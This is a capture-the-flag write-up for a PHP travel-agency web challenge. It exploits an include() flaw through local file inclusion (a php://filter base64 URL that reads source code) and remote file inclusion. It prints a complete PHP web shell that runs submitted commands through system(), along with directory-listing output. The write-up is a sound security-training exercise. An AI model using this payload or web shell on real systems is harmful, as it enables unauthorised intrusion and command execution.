---
description: LFI + RFI
---

# Travel Agency

### Description

{% code title="Challenge description.txt" overflow="wrap" %}
```
A travel agency website that lets users explore destinations from all over the world. The dev team recently added a ""preview template"" feature that dynamically loads different pages based on user selection.

Everything looks smooth on the surface, but a careless implementation might have left the site vulnerable to more than just wanderlust...

Can you dig into the source and go on a remote adventure to retrieve the flag?
```
{% endcode %}

### Homepage

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

After clicking on other page, there were no dynamic output for our input, although I noticed the page was loading using `?page` parameter, which made me think for LFI.

I pulled index.php code using base64 filter, as it was LFI and not file disclosure.\
If it were to be file disclosure, we could've pulled index.php without base64 as that way the server wouldn't have executed PHP code.

{% code overflow="wrap" %}
```html
http://13.201.125.136:54827/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Here's the vulnerable logic, it's using `include` of php. \


{% embed url="https://www.php.net/manual/en/function.include.php" %}

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

If we see `Example 3` of above mannual, it tells we can use `include()` to get/load pages via `HTTP` as well.&#x20;

### RFI

```php
<html>
<body>
# SNIPPED

<h2>Execute Command</h2>
<form method="POST">
    <input type="text" name="cmd" placeholder="Input command..." autocomplete="off" required>
    <input type="submit" value="Run">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cmd = $_POST["cmd"];
    echo "<h3>Output:</h3><pre>";
    system($cmd);
    echo "</pre>";
}
?>

</body>
</html>
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% code title="ls -la" overflow="wrap" %}
```bash
total 24
drwxrwxrwx 1 www-data www-data   34 Jun 27 10:07 .
drwxr-xr-x 1 root     root       18 Jun 27 10:07 ..
-rw-r--r-- 1 root     root      113 Jun 27 10:05 S3cRetP4g329658.html
-rw-r--r-- 1 root     root      800 Jun 27 07:19 flights.php
-rw-r--r-- 1 root     root      263 Jun 27 07:19 home.php
-rw-r--r-- 1 root     root      761 Jun 27 07:19 hotels.php
-rw-r--r-- 1 root     root     2059 Jun 27 07:19 index.php
-rw-r--r-- 1 root     root      572 Jun 27 07:19 tours.php
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>— done — </p></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
